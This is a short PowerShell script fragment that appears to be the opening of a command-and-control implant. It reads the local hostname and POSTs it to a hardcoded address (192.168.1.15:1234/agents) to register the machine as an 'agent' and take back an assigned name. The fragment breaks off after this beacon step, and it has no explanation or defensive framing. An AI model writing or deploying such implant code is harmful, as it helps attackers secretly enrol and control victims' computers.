$ip   = "192.168.1.15"
$port = "1234"
$n    = 3
$name = ""

$hname = [System.Net.Dns]::GetHostName()
$type  = "PowerShell"
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/agents")
$data  = @{
    name = "$hname"
    type = "$type"
    }
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content


